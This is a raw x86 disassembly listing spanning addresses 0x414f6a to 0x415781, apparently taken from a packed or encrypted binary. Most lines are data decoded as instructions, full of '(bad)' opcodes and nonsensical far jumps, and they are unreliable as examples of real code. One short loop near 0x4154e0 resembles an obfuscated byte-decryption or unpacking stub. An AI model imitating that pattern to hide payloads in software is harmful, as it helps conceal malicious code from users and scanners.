  414f6a:	jge    0x414f66
  414f6c:	add    al,ah
  414f6e:	adc    esp,DWORD PTR [eax]
  414f70:	push   es
  414f71:	ins    DWORD PTR es:[edi],dx
  414f72:	fstp   st(2)
  414f74:	xor    BYTE PTR [ecx],ah
  414f76:	out    dx,al
  414f77:	add    ebp,DWORD PTR [ebx-0x32840609]
  414f7d:	sbb    cl,BYTE PTR [ebp+0x6cdd7491]
  414f83:	mov    edi,0x3ac58b4a
  414f88:	sub    al,0x60
  414f8a:	sub    cl,BYTE PTR [edx-0x38]
  414f8d:	jmp    0x414fab
  414f8f:	push   ss
  414f90:	retf   0x3ec4
  414f93:	sub    ah,BYTE PTR gs:[edx+0x5d]
  414f97:	jo     0x414f33
  414f99:	sbb    eax,0x724e38a4
  414f9e:	mov    ecx,0xba946ef1
  414fa3:	dec    eax
  414fa4:	jmp    0x414f6b
  414fa6:	mov    ebp,0x87a9c87
  414fab:	cld    
  414fac:	fs push edx
  414fae:	les    ebx,FWORD PTR [ecx-0x1f5e0c4c]
  414fb4:	xchg   ah,ah
  414fb6:	es xchg esi,eax
  414fb8:	retf   0x2c94
  414fbb:	mov    eax,ds:0x7dd2fc8d
  414fc0:	(bad)  
  414fc2:	dec    edx
  414fc3:	mov    BYTE PTR [esi+ecx*4-0x28],dl
  414fc7:	aam    0x9e
  414fc9:	or     dh,BYTE PTR [esi-0x5dda2c5c]
  414fcf:	jge    0x415035
  414fd1:	nop
  414fd2:	lock inc esp
  414fd4:	sbb    esp,DWORD PTR [ecx+0x2942994c]
  414fda:	or     BYTE PTR [edx+0x49],ah
  414fdd:	test   eax,0x73e201ee
  414fe2:	int3   
  414fe3:	lods   al,BYTE PTR ds:[esi]
  414fe4:	rcr    BYTE PTR [edi-0x4c4d96c1],1
  414fea:	lahf   
  414feb:	mov    BYTE PTR [edx+eax*2-0x13],ah
  414fef:	in     al,0x32
  414ff1:	leave  
  414ff2:	mov    ah,0x67
  414ff4:	and    al,BYTE PTR [esi+0x6954c20a]
  414ffa:	lds    edi,FWORD PTR ds:0xfc5064ef
  415000:	into   
  415001:	popf   
  415002:	pop    ebx
  415003:	sbb    ebx,0xaebbfc36
  415009:	cmp    al,0x34
  41500b:	xchg   DWORD PTR [eax-0x29],ecx
  41500e:	dec    eax
  41500f:	cmp    bl,cl
  415011:	xor    al,0x75
  415013:	cwde   
  415014:	outs   dx,DWORD PTR ds:[esi]
  415015:	into   
  415016:	jmp    0x828c:0x8e6c0273
  41501d:	aaa    
  41501e:	push   edi
  41501f:	inc    ebp
  415020:	adc    edx,eax
  415022:	mov    ch,0xb1
  415024:	out    0xda,al
  415026:	and    esi,edi
  415028:	jns    0x414fcc
  41502a:	and    DWORD PTR [edx-0x3abad213],ecx
  415030:	or     ah,ch
  415032:	ins    DWORD PTR es:[edi],dx
  415033:	push   cs
  415034:	and    eax,0x37a2f474
  415039:	rep outs dx,DWORD PTR ds:[esi]
  41503b:	rcr    DWORD PTR [esi-0x2],cl
  41503e:	sar    esi,0xdc
  415041:	retf   
  415042:	jp     0x41506b
  415044:	in     eax,dx
  415045:	(bad)  
  415046:	sub    DWORD PTR [ebx-0xa],eax
  415049:	clc    
  41504a:	jae    0x414fef
  41504c:	xor    bh,BYTE PTR [esi+0x373128df]
  415052:	inc    ecx
  415053:	push   eax
  415054:	mov    bl,0xbc
  415056:	mov    edx,0x887ccd27
  41505b:	cwde   
  41505c:	xchg   edx,eax
  41505d:	shl    BYTE PTR [esi+0x5c],1
  415060:	cld    
  415061:	(bad)  
  415062:	xor    esi,eax
  415064:	cmp    DWORD PTR [edx+0x41c9d959],edi
  41506a:	(bad)  
  41506b:	(bad)  
  41506d:	dec    ebx
  41506e:	pop    esp
  41506f:	or     edx,DWORD PTR [eax+0x77edf12f]
  415075:	push   ebp
  415076:	ror    BYTE PTR [ebp+0x1c4297b2],1
  41507c:	pusha  
  41507d:	cli    
  41507e:	adc    eax,0x7bbe84e6
  415083:	and    dh,ah
  415085:	jmp    0x4150e7
  415087:	out    dx,al
  415088:	jno    0x415023
  41508a:	mov    cl,0xab
  41508c:	out    0xfa,al
  41508e:	jmp    0xadf56e18
  415093:	mov    ds:0xe330581d,al
  415098:	jmp    0x8b82:0xf8b7b0c0
  41509f:	sbb    ecx,DWORD PTR [ebp+eiz*8+0x59]
  4150a3:	std    
  4150a4:	xor    BYTE PTR [edx+esi*8-0x4a],al
  4150a8:	aam    0xa2
  4150aa:	lock add edx,DWORD PTR [edi+0x5a]
  4150ae:	call   0x83fd5c7c
  4150b3:	and    al,0x31
  4150b5:	leave  
  4150b6:	jp     0x4150ab
  4150b8:	mov    ebx,DWORD PTR [edi+0x30c68a2b]
  4150be:	dec    ecx
  4150bf:	xchg   DWORD PTR [edi-0x7acba715],esi
  4150c5:	jb     0x415056
  4150c7:	jecxz  0x415101
  4150c9:	out    0x7e,eax
  4150cb:	scas   al,BYTE PTR es:[edi]
  4150cc:	mov    eax,ds:0x90108757
  4150d1:	mov    ah,0xd8
  4150d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150d4:	aad    0xf0
  4150d6:	xchg   ebx,eax
  4150d7:	xor    al,0xc6
  4150d9:	es out dx,al
  4150db:	fwait
  4150dc:	mov    ds:0xa0a0a574,al
  4150e1:	xchg   esp,eax
  4150e2:	mov    edx,esi
  4150e4:	mov    ebp,0xce060d08
  4150e9:	mov    al,BYTE PTR [ecx]
  4150eb:	test   BYTE PTR [ecx],ch
  4150ed:	and    eax,0x36048a80
  4150f2:	push   esi
  4150f3:	daa    
  4150f4:	pop    edi
  4150f5:	and    BYTE PTR [edi+0x32aeca20],cl
  4150fb:	jbe    0x415113
  4150fd:	ret    
  4150fe:	mov    al,ds:0x7ffc5a4b
  415103:	jl     0x4150ba
  415105:	outs   dx,BYTE PTR ds:[esi]
  415106:	cmp    DWORD PTR [ecx-0x58],esp
  415109:	ja     0x415137
  41510b:	push   edi
  41510c:	jg     0x415138
  41510e:	aas    
  41510f:	adc    al,0x6a
  415111:	call   FWORD PTR [edi+0x72]
  415114:	or     bl,al
  415116:	mov    WORD PTR [eax+eiz*4],cs
  415119:	lods   eax,DWORD PTR ds:[esi]
  41511a:	add    DWORD PTR [ebx-0x330ea6c],edi
  415120:	xchg   ebp,eax
  415121:	in     al,0xce
  415123:	mov    ecx,esi
  415125:	ds retf 
  415127:	sbb    eax,DWORD PTR [ecx+ebp*8+0x4e]
  41512b:	loope  0x4150f6
  41512d:	jecxz  0x415110
  41512f:	scas   al,BYTE PTR es:[edi]
  415130:	stos   DWORD PTR es:[edi],eax
  415131:	dec    ecx
  415132:	(bad)  
  415134:	repnz fcomp QWORD PTR [edi]
  415137:	retf   
  415138:	add    esi,edx
  41513a:	mov    ds:0x3df859a6,al
  41513f:	pop    ss
  415140:	jae    0x415110
  415142:	std    
  415143:	fisttp DWORD PTR ds:0xfe27936a
  415149:	pop    ecx
  41514a:	mov    ecx,0x3670f285
  41514f:	leave  
  415150:	call   FWORD PTR [eax+0x57b79097]
  415156:	cmp    dh,BYTE PTR [ecx]
  415158:	mov    ah,0xc1
  41515a:	fs out dx,eax
  41515c:	lds    ebx,FWORD PTR [edx-0x55]
  41515f:	push   0xae00e72e
  415164:	icebp  
  415165:	sub    eax,0xf46152af
  41516a:	rol    BYTE PTR [edx+edx*8-0x6f7800ff],0x44
  415172:	inc    eax
  415173:	dec    edx
  415174:	cmp    BYTE PTR [edi],cl
  415176:	xor    esp,ebx
  415178:	mov    edx,0x6f34c669
  41517d:	lods   eax,DWORD PTR ds:[esi]
  41517e:	dec    BYTE PTR [edi]
  415180:	test   BYTE PTR [esi-0x38fffff9],ah
  415186:	inc    ebp
  415187:	call   0x41618d
  41518c:	mov    edx,DWORD PTR [ebp-0x1c]
  41518f:	xor    ecx,ecx
  415191:	test   edx,edx
  415193:	jmp    0x4154cc
  415198:	jno    0x4151dd
  41519a:	mov    edx,0xb9bcbc52
  41519f:	fs inc eax
  4151a1:	sub    BYTE PTR [edx],bh
  4151a3:	xchg   edx,eax
  4151a4:	sbb    DWORD PTR [eax-0x4fc31c68],ecx
  4151aa:	mov    esi,0xbec4edbe
  4151af:	mov    esi,0x9220d4e6
  4151b4:	or     ah,BYTE PTR [esp+ebx*8]
  4151b7:	cmc    
  4151b8:	mov    cl,0x7e
  4151ba:	mov    esi,0x5005e10f
  4151bf:	sbb    eax,0x5f7b5330
  4151c4:	adc    edi,ecx
  4151c6:	push   0x5b
  4151c8:	mov    esi,0xcab13fb7
  4151cd:	or     al,0x67
  4151cf:	sar    BYTE PTR [esi],cl
  4151d1:	cli    
  4151d2:	mov    BYTE PTR [edi+0xa],bl
  4151d5:	jmp    0x41520d
  4151d7:	les    eax,FWORD PTR [ecx+0x464e11c3]
  4151dd:	repz cmp eax,0x9ad44d14
  4151e3:	clc    
  4151e4:	loop   0x4151cc
  4151e6:	or     DWORD PTR [ebp+0x2bf127a8],edx
  4151ec:	sar    esp,cl
  4151ee:	push   cs
  4151ef:	add    eax,0x63b274
  4151f4:	and    bh,BYTE PTR [edi]
  4151f6:	scas   eax,DWORD PTR es:[edi]
  4151f7:	loope  0x4151e1
  4151f9:	inc    esi
  4151fa:	inc    ebp
  4151fb:	out    dx,al
  4151fc:	inc    esi
  4151fd:	xor    BYTE PTR [ebp-0x35],0x71
  415201:	in     eax,dx
  415202:	push   ebp
  415203:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415204:	xor    BYTE PTR [ecx-0xbc1a072],cl
  41520a:	or     eax,0x1879309a
  41520f:	jno    0x415226
  415211:	fidiv  DWORD PTR ds:0x11e2cb9f
  415217:	pop    ss
  415218:	fwait
  415219:	bound  ebx,QWORD PTR [eax+eiz*4-0x57]
  41521d:	xchg   ecx,eax
  41521e:	sbb    eax,0x958efc6e
  415223:	or     DWORD PTR [eax-0x26],esi
  415226:	mov    eax,0x4ab3de61
  41522b:	(bad)  
  41522c:	pop    ebx
  41522d:	in     eax,dx
  41522e:	bound  edx,QWORD PTR [ecx-0x6]
  415231:	xor    DWORD PTR ds:0x850d0967,0xb181644c
  41523b:	loop   0x415278
  41523d:	cmp    ch,BYTE PTR [edx+0x1248c851]
  415243:	nop
  415244:	ja     0x4152b4
  415246:	jmp    0x97a0:0x2a1d435a
  41524d:	(bad)  
  41524e:	les    eax,FWORD PTR [ecx-0xacc9589]
  415254:	repz fild QWORD PTR [ebp-0x1d92b87b]
  41525b:	sub    bl,BYTE PTR [edx+eiz*2+0x1a]
  41525f:	and    esi,ecx
  415261:	out    dx,al
  415262:	mov    edx,0x67e81edf
  415267:	sbb    dl,ah
  415269:	or     al,0xa9
  41526b:	test   BYTE PTR [esi+ecx*4+0x13a684dc],ah
  415272:	sub    ebx,esp
  415274:	and    ebp,0x12
  415277:	je     0x4152a1
  415279:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41527a:	scas   eax,DWORD PTR es:[edi]
  41527b:	pop    ebp
  41527c:	lahf   
  41527d:	add    al,0x8a
  41527f:	(bad)  
  415280:	cli    
  415281:	stc    
  415282:	adc    BYTE PTR [esp+esi*8-0x3d526ab6],bh
  415289:	(bad)
  41528c:	push   ds
  41528d:	add    ebx,ebx
  41528f:	adc    edi,DWORD PTR [ebp-0x16]
  415292:	mov    ecx,0x81401ad3
  415297:	or     al,0xa6
  415299:	mov    esp,?
  41529b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41529c:	adc    BYTE PTR [ebx-0x3ea2ed6c],ah
  4152a2:	xor    edi,esp
  4152a4:	push   cs
  4152a5:	or     eax,0x478c87f
  4152aa:	inc    ecx
  4152ab:	push   ecx
  4152ac:	call   0x92e0:0xf87e0843
  4152b3:	push   0x73
  4152b5:	mov    dh,BYTE PTR [ebx]
  4152b7:	push   eax
  4152b8:	das    
  4152b9:	push   es
  4152ba:	jmp    0x4152f9
  4152bc:	mov    al,0x50
  4152be:	sub    al,0x5f
  4152c0:	pop    esi
  4152c1:	not    BYTE PTR [edi-0x37f10554]
  4152c7:	mov    esi,0x18cb1703
  4152cc:	rcl    BYTE PTR [eax+0x2a3b04dc],1
  4152d2:	inc    esp
  4152d3:	lods   eax,DWORD PTR ds:[esi]
  4152d4:	push   ds
  4152d5:	mov    esp,0xb9a4367d
  4152da:	xchg   ebp,eax
  4152db:	(bad)  
  4152dc:	and    DWORD PTR ss:[ecx],eax
  4152df:	mov    ss,WORD PTR [ebp+0x7483959e]
  4152e5:	std    
  4152e6:	mov    bl,0x61
  4152e8:	mov    ah,0xd3
  4152ea:	(bad)  ds:0x8399e0ea
  4152f0:	leave  
  4152f1:	xor    ebp,DWORD PTR [edx+0x73f81f01]
  4152f7:	(bad)  
  4152f8:	fisttp DWORD PTR [ebx+edi*1]
  4152fb:	inc    ebp
  4152fc:	out    dx,al
  4152fd:	js     0x415321
  4152ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415300:	adc    al,0x1
  415302:	mov    ds:0xa5654610,al
  415307:	jae    0x41534b
  415309:	mul    BYTE PTR [ebx-0x68]
  41530c:	(bad)  
  41530d:	or     ah,BYTE PTR [eax-0x798aad6e]
  415313:	or     eax,0x9fd0fb19
  415318:	mov    cl,bl
  41531a:	rcl    DWORD PTR [edx+0x239affae],cl
  415320:	arpl   WORD PTR [eax-0x63],cx
  415323:	call   0x957:0xf53f8bea
  41532a:	lods   al,BYTE PTR ds:[esi]
  41532b:	sub    al,0x27
  41532d:	dec    ecx
  41532e:	div    ch
  415330:	xchg   ecx,eax
  415331:	push   es
  415332:	adc    BYTE PTR [ebx],cl
  415334:	repnz or edx,esp
  415337:	xor    DWORD PTR [ebx+ebp*2-0x537586d8],ecx
  41533e:	retf   0xe3b7
  415341:	xchg   edx,eax
  415342:	stos   DWORD PTR es:[edi],eax
  415343:	cdq    
  415344:	daa    
  415345:	out    0x6e,al
  415347:	call   0xef91:0x595a800a
  41534e:	xchg   ebp,eax
  41534f:	and    ah,BYTE PTR [ebx+0x21]
  415352:	pop    ebp
  415353:	jb     0x41536e
  415355:	es push eax
  415357:	inc    ebx
  415358:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415359:	adc    eax,0x6c1e4904
  41535e:	in     eax,dx
  41535f:	into   
  415360:	bound  esi,QWORD PTR [eax+0x2d6ddd9e]
  415366:	out    0x99,al
  415368:	int    0x4a
  41536a:	pop    ds
  41536b:	add    BYTE PTR [ecx+0x61],dl
  41536e:	sub    edi,edx
  415370:	(bad)  
  415371:	repnz out 0xc8,al
  415374:	out    dx,eax
  415375:	fs adc eax,0xb7a6f8e2
  41537b:	in     eax,dx
  41537c:	cld    
  41537d:	sbb    DWORD PTR [ecx-0x1761856a],edi
  415383:	lea    edi,[esi+0x62]
  415386:	and    al,0xc1
  415388:	jne    0x415368
  41538a:	sub    DWORD PTR [ecx+0x2822b825],ebp
  415390:	xlat   BYTE PTR ds:[ebx]
  415391:	dec    BYTE PTR ds:0x39e4fd5c
  415397:	fwait
  415398:	mov    DWORD PTR [ecx+0x12f79174],ecx
  41539e:	xchg   esp,eax
  41539f:	ins    DWORD PTR es:[edi],dx
  4153a0:	cmp    eax,0xac1a5c4d
  4153a5:	in     al,dx
  4153a6:	or     DWORD PTR [ebp+0x65],ecx
  4153a9:	dec    eax
  4153aa:	cmp    eax,DWORD PTR [esi+edx*4+0x4d]
  4153ae:	add    dl,al
  4153b0:	(bad)  
  4153b1:	in     al,dx
  4153b2:	mov    dl,0x14
  4153b4:	sub    BYTE PTR [eax-0x2e],0xa4
  4153b8:	mov    dh,ah
  4153ba:	pop    eax
  4153bb:	pop    ds
  4153bc:	(bad)  
  4153bd:	retf   
  4153be:	pop    eax
  4153bf:	jne    0x41534d
  4153c1:	sub    al,BYTE PTR [ebp-0x2dff089e]
  4153c7:	dec    esi
  4153c8:	cmp    eax,DWORD PTR [ebx-0x2ae71601]
  4153ce:	push   ecx
  4153cf:	aad    0x0
  4153d1:	ret    0xe57e
  4153d4:	leave  
  4153d5:	test   al,0xcf
  4153d7:	sub    cl,ch
  4153d9:	add    BYTE PTR [edx-0x17],ah
  4153dc:	in     al,dx
  4153dd:	add    eax,ebx
  4153df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153e0:	stos   BYTE PTR es:[edi],al
  4153e1:	xchg   edi,eax
  4153e2:	sahf   
  4153e3:	xor    eax,0x52bd4af
  4153e8:	daa    
  4153e9:	sub    BYTE PTR [eax+ecx*8+0x74],al
  4153ed:	mov    bh,BYTE PTR [edx]
  4153ef:	frstor ds:0x81f530c1
  4153f5:	sub    DWORD PTR [ebx+0x48],ecx
  4153f8:	jmp    0x5f2d:0xea1caab0
  4153ff:	ror    ebx,1
  415401:	scas   eax,DWORD PTR es:[edi]
  415402:	arpl   WORD PTR [eax-0x6e85ffc7],sp
  415408:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415409:	enter  0x9ad4,0xac
  41540d:	not    dl
  41540f:	add    BYTE PTR [ebp-0x10d2176c],ch
  415415:	sbb    ch,BYTE PTR [edi-0x6d524707]
  41541b:	sbb    DWORD PTR [ebx-0x3b584019],ebx
  415421:	pop    ebp
  415422:	jmp    0x3c4e:0x87c3a7c7
  415429:	js     0x415494
  41542b:	sbb    ch,ah
  41542d:	test   DWORD PTR ds:0x9139f9f7,esp
  415433:	sbb    BYTE PTR [eax],al
  415435:	ret    0xda0a
  415438:	shr    DWORD PTR [esi-0x639d0d0f],0x59
  41543f:	push   cs
  415440:	into   
  415441:	and    eax,DWORD PTR [ecx+0x418f783b]
  415447:	and    DWORD PTR [esi],0x22
  41544a:	adc    BYTE PTR [ecx+0x51e79d7],dh
  415450:	(bad)  
  415451:	xchg   ebx,eax
  415452:	ja     0x41544b
  415454:	xchg   ebx,eax
  415455:	(bad)  
  415456:	jmp    0x4154d6
  415458:	mov    ebp,0x3c2f3bfe
  41545d:	cmc    
  41545e:	call   0x5d60:0xbda770d2
  415465:	dec    edx
  415466:	mov    ds:0x1ee38a96,al
  41546b:	sti    
  41546c:	int3   
  41546d:	leave  
  41546e:	inc    ebx
  41546f:	std    
  415470:	xor    al,0x9a
  415472:	cmp    eax,ebp
  415474:	cmp    ch,cl
  415476:	retf   
  415477:	sbb    al,0xe5
  415479:	addr16 pop ebx
  41547b:	xor    DWORD PTR ss:[edi+0x217c03ef],esi
  415482:	push   ebp
  415483:	lods   al,BYTE PTR ds:[esi]
  415484:	shl    BYTE PTR ss:[esi+0x5f],0xea
  415489:	xchg   edi,eax
  41548a:	or     al,0x3e
  41548c:	scas   al,BYTE PTR es:[edi]
  41548d:	les    esi,FWORD PTR [ecx]
  41548f:	add    eax,0x96e0a9cc
  415494:	scas   al,BYTE PTR es:[edi]
  415495:	pop    esp
  415496:	dec    eax
  415497:	dec    edx
  415498:	jae    0x41547b
  41549a:	sub    BYTE PTR [ebp-0x47],dh
  41549d:	sub    eax,0x6a584ede
  4154a2:	cwde   
  4154a3:	lods   al,BYTE PTR ds:[esi]
  4154a4:	add    ebp,DWORD PTR ds:0x536b4f3e
  4154aa:	jle    0x4154cd
  4154ac:	sub    dl,BYTE PTR gs:[edx+eax*8]
  4154b0:	push   ebx
  4154b1:	push   es
  4154b2:	mul    DWORD PTR [edx]
  4154b4:	xchg   BYTE PTR [ebp-0x2450a5a2],dh
  4154ba:	lods   al,BYTE PTR ds:[esi]
  4154bb:	cmp    BYTE PTR [ecx+0x33],al
  4154be:	call   DWORD PTR [ebx]
  4154c0:	pusha  
  4154c1:	dec    esi
  4154c2:	sbb    cl,BYTE PTR [ecx-0x22]
  4154c5:	add    al,0xe3
  4154c7:	and    BYTE PTR [edx],0x99
  4154ca:	or     eax,0x7e840f65
  4154cf:	add    BYTE PTR [eax],al
  4154d1:	add    BYTE PTR [edx+0x45883904],cl
  4154d7:	inc    esi
  4154d9:	inc    ebp
  4154da:	std    
  4154db:	je     0x4154a3
  4154dd:	inc    ebp
  4154de:	(bad)  
  4154df:	push   ss
  4154e0:	mov    BYTE PTR [ebp-0x4],0x62
  4154e4:	movzx  eax,BYTE PTR [ebp-0x4]
  4154e8:	movzx  ebx,BYTE PTR [ebp-0x2]
  4154ec:	or     eax,0xd4
  4154f1:	and    eax,ebx
  4154f3:	movzx  ebx,BYTE PTR [ebp-0x3]
  4154f7:	and    eax,ebx
  4154f9:	mov    BYTE PTR [ebp-0x12],al
  4154fc:	mov    BYTE PTR [ebp-0x11],0xfe
  415500:	mov    BYTE PTR [ebp-0x14],0x32
  415504:	mov    BYTE PTR [ebp-0x4],0xc7
  415508:	mov    BYTE PTR [ebp-0x2],0x73
  41550c:	mov    BYTE PTR [ebp-0x3],0xb3
  415510:	mov    al,BYTE PTR [ebp-0x3]
  415513:	mov    bl,BYTE PTR [ebp-0x2]
  415516:	or     al,bl
  415518:	mov    bl,BYTE PTR [ebp-0x4]
  41551b:	sub    al,bl
  41551d:	mov    bl,BYTE PTR [ebp-0x14]
  415520:	imul   bl
  415522:	mov    bl,BYTE PTR [ebp-0x11]
  415525:	sub    al,bl
  415527:	mov    bl,BYTE PTR [ebp-0x12]
  41552a:	cmp    bl,al
  41552c:	ja     0x415541
  415532:	movzx  eax,BYTE PTR [ebp-0x1]
  415536:	sub    eax,0xed
  41553b:	mov    BYTE PTR [ebp-0x1],al
  41553e:	ror    BYTE PTR [ebp-0x1],1
  415541:	mov    al,BYTE PTR [ebp-0x1]
  415544:	mov    BYTE PTR [ecx+edi*1],al
  415547:	inc    ecx
  415548:	cmp    ecx,edx
  41554a:	jb     0x4154d2
  415550:	dec    DWORD PTR [ebp-0x18]
  415553:	jne    0x41518c
  415559:	mov    eax,DWORD PTR [ebp+0x8]
  41555c:	mov    ecx,DWORD PTR [ebp+0xc]
  41555f:	shrd   eax,ecx,0x2
  415563:	shr    ecx,0x2
  415566:	mov    ecx,DWORD PTR [ebp+0x8]
  415569:	mov    edx,DWORD PTR [ebp+0xc]
  41556c:	xor    eax,esi
  41556e:	xor    edx,edx
  415570:	jmp    0x4158a9
  415575:	cmp    dl,BYTE PTR [ebx]
  415577:	inc    esi
  415578:	mov    WORD PTR [eax-0x64],gs
  41557b:	cmp    al,0xb3
  41557d:	mov    ch,0xd8
  41557f:	(bad)  
  415580:	fld    QWORD PTR [edi+0x6ccff26a]
  415586:	mov    dh,0xbe
  415588:	mov    esi,0xbebec4ed
  41558d:	sub    eax,0xe2c3974a
  415592:	fwait
  415593:	cld    
  415594:	fnstcw WORD PTR [esi+ebx*1-0x3c]
  415598:	and    BYTE PTR [ecx-0x18],dh
  41559b:	mov    ah,0x34
  41559d:	cmovnp edi,DWORD PTR [eax]
  4155a0:	cdq    
  4155a1:	sbb    cl,0x6f
  4155a4:	push   0x5746e776
  4155a9:	mov    eax,ds:0xd6462a31
  4155ae:	lahf   
  4155af:	sbb    DWORD PTR es:0x9d3160a9,esp
  4155b6:	jl     0x4155e3
  4155b8:	popa   
  4155b9:	dec    edi
  4155ba:	inc    ebp
  4155bb:	test   DWORD PTR ds:0x37da9385,eax
  4155c1:	jo     0x41555c
  4155c3:	jae    0x41559f
  4155c5:	push   es
  4155c6:	push   ecx
  4155c7:	adc    eax,0x54dbf40e
  4155cc:	or     bl,cl
  4155ce:	fadd   st(0),st
  4155d0:	add    al,0x34
  4155d2:	adc    esp,DWORD PTR [ebx+0x20]
  4155d5:	loop   0x415621
  4155d7:	mov    ecx,DWORD PTR [esi-0x3aef70c7]
  4155dd:	lahf   
  4155de:	cld    
  4155df:	adc    DWORD PTR [edi+edi*4-0x5c],ebp
  4155e3:	sub    BYTE PTR [esi],ch
  4155e5:	inc    ecx
  4155e6:	rcl    DWORD PTR [ebx],0x36
  4155e9:	xor    dl,al
  4155eb:	fwait
  4155ec:	cmp    al,0xda
  4155ee:	pop    esp
  4155ef:	ret    0x5543
  4155f2:	call   0xe2a89f4f
  4155f7:	outs   dx,BYTE PTR ds:[esi]
  4155f8:	and    BYTE PTR [edx],bl
  4155fa:	pop    ebx
  4155fb:	dec    ebx
  4155fc:	es ja  0x415660
  4155ff:	imul   BYTE PTR [ebx+0xb12df0]
  415605:	pop    esi
  415606:	jb     0x41562a
  415608:	mov    ds:0xb339daad,eax
  41560d:	and    bh,BYTE PTR [esi+eax*8]
  415610:	sti    
  415611:	dec    ebx
  415612:	repz pop ebx
  415614:	push   ebx
  415615:	hlt    
  415616:	in     al,0x84
  415618:	push   eax
  415619:	jnp    0x4155b7
  41561b:	fwait
  41561c:	out    0xae,eax
  41561e:	dec    ebx
  41561f:	pop    esi
  415620:	(bad)  
  415621:	sti    
  415622:	ret    
  415623:	push   cs
  415624:	xlat   BYTE PTR ds:[ebx]
  415625:	push   esp
  415626:	leave  
  415627:	pop    es
  415628:	sbb    ecx,DWORD PTR [ecx+0x6b9416d5]
  41562e:	scas   eax,DWORD PTR es:[edi]
  41562f:	jmp    0xcae611a8
  415634:	jb     0x4155fe
  415636:	jp     0x41561d
  415638:	sub    eax,eax
  41563a:	inc    ecx
  41563b:	jbe    0x4155eb
  41563d:	ret    0xd8ce
  415640:	add    eax,0x859e3694
  415645:	popa   
  415646:	inc    ebx
  415647:	add    BYTE PTR [ebx],dl
  415649:	out    dx,al
  41564a:	loope  0x4156b3
  41564c:	out    dx,eax
  41564d:	icebp  
  41564e:	mov    cl,0xc
  415650:	or     edi,DWORD PTR [esi+0x2085b5f]
  415656:	sbb    BYTE PTR [esi+0x5f2d6b79],ah
  41565c:	adc    edx,DWORD PTR ds:0x9b43b45c
  415662:	mov    BYTE PTR [edx-0x2],ah
  415665:	or     al,0xc6
  415667:	popf   
  415668:	loop   0x415605
  41566a:	mov    bh,ch
  41566c:	jb     0x415694
  41566e:	mov    edi,0x51a21770
  415673:	sbb    DWORD PTR [ebp-0x6f5c1f59],esi
  415679:	stc    
  41567a:	js     0x4156d7
  41567c:	out    0x6,al
  41567e:	or     ch,BYTE PTR [edi+0x78]
  415681:	fnstsw WORD PTR [edi+0x7f743afd]
  415687:	retfw  
  415689:	das    
  41568a:	out    dx,al
  41568b:	mov    ah,0xc3
  41568d:	stc    
  41568e:	mov    eax,0x8543f521
  415693:	iret   
  415694:	pop    ecx
  415695:	mov    BYTE PTR [edi+0x19],cl
  415698:	enter  0x8fd0,0x75
  41569c:	repnz mov ch,0xc8
  41569f:	shr    al,0x2a
  4156a2:	ins    BYTE PTR es:[edi],dx
  4156a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156a4:	mov    edx,0xe9ee659f
  4156a9:	pop    edi
  4156aa:	out    dx,eax
  4156ab:	daa    
  4156ac:	sub    BYTE PTR ds:0x549d0b88,dl
  4156b2:	popf   
  4156b3:	and    eax,0x536f0ca7
  4156b8:	retf   0x9722
  4156bb:	imul   esp,DWORD PTR [eax+ebx*8+0x7],0xffffff85
  4156c0:	out    dx,eax
  4156c1:	mov    eax,0xeb9ee386
  4156c6:	adc    dh,dl
  4156c8:	fcom   DWORD PTR [edx+0x372ab734]
  4156ce:	arpl   WORD PTR [esi-0xd],cx
  4156d1:	mov    ecx,esi
  4156d3:	push   edx
  4156d4:	adc    esi,edx
  4156d6:	mov    bh,0xbd
  4156d8:	stos   BYTE PTR es:[edi],al
  4156d9:	add    edi,DWORD PTR [edi+ebx*1]
  4156dc:	cld    
  4156dd:	pop    ebp
  4156de:	ret    
  4156df:	int    0x9e
  4156e1:	es dec ebp
  4156e3:	ret    0x3d0
  4156e6:	ins    DWORD PTR es:[edi],dx
  4156e7:	dec    bp
  4156e9:	dec    esi
  4156ea:	or     BYTE PTR [edx-0x548e4684],cl
  4156f0:	repz or al,0x4
  4156f3:	cdq    
  4156f4:	and    ebp,DWORD PTR [edx+0x49]
  4156f7:	xor    ch,BYTE PTR [edi+0x3f82f7e6]
  4156fd:	cmp    BYTE PTR [eax+ecx*2-0x4d],ah
  415701:	push   esi
  415702:	pop    ebp
  415703:	leave  
  415704:	lods   eax,DWORD PTR ds:[si]
  415706:	sub    al,0x5f
  415708:	or     al,0x9a
  41570a:	enter  0x97ef,0x75
  41570e:	pop    esi
  41570f:	clc    
  415710:	mov    al,ds:0xea1753a7
  415715:	inc    BYTE PTR [edi+0x71018deb]
  41571b:	mov    eax,ds:0xb35433d8
  415720:	mov    dh,0xe
  415722:	mov    esp,0xbf515b4c
  415727:	enter  0x87ab,0x6d
  41572b:	lea    ebp,[edi+0x18112c3c]
  415731:	xor    eax,0x34d6d62c
  415736:	xor    al,0xdd
  415738:	pop    ds
  415739:	or     DWORD PTR [edi],edx
  41573b:	inc    esp
  41573c:	pop    edi
  41573d:	cmc    
  41573e:	push   ecx
  41573f:	inc    esi
  415740:	(bad)  
  415741:	pop    eax
  415742:	mov    esp,esi
  415744:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415745:	jne    0x41577d
  415747:	adc    DWORD PTR [ebx+eiz*1-0x6],edx
  41574b:	and    DWORD PTR [edx+0x42],esi
  41574e:	xchg   ebx,eax
  41574f:	mov    ds,esi
  415751:	sbb    al,0xd2
  415753:	cmp    ebx,DWORD PTR [ebx+ecx*8]
  415756:	clc    
  415757:	repnz aaa 
  415759:	(bad)  
  41575a:	xor    al,0xe3
  41575c:	sbb    bh,BYTE PTR [esp+esi*2-0x668bb203]
  415763:	cmp    bl,dl
  415765:	sub    ebp,DWORD PTR [ebx+0x14]
  415768:	or     ecx,eax
  41576a:	mov    edx,ds
  41576c:	adc    BYTE PTR [ebx-0xa],dl
  41576f:	jg     0x41577a
  415771:	loope  0x41578f
  415773:	mov    dl,0x8
  415775:	add    eax,0xffffffac
  415778:	idiv   BYTE PTR [edx]
  41577a:	imul   ebp,ecx,0x97a688b0
  415780:	inc    esp
  415781:	mov    eax,0xa4377b5d
